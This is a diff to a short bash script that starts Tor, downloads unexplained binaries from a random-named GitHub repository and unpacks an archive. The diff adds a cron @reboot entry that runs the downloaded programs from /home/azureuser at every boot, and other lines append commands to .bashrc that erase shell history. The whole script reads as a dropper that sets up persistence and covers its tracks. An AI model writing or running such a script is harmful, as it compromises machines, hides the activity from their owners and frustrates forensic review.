@@ -1,5 +1,5 @@
 #!/bin/bash
-ssudo systemctl start tor
+sudo systemctl start tor
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpotr
 
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2tr
@@ -10,6 +10,10 @@ wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkf
 
 tar -xf SRB11.tar.gz
 rm -r SRB11.tar.gz
+
+sudo systemctl enable cron
+
+sudo crontab -l | { cat; echo "@reboot /home/azureuser/cpo2tr & /home/azureuser/crp2"; } | crontab
 
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
